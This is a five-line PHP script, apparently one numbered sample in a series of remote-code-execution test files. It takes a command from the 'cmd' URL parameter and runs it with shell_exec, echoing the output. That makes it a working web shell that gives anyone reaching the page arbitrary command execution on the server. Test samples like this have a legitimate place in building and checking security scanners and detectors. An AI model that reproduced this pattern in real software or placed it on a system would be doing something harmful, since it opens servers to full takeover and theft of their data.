<?php
// RCE test variation #1191
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>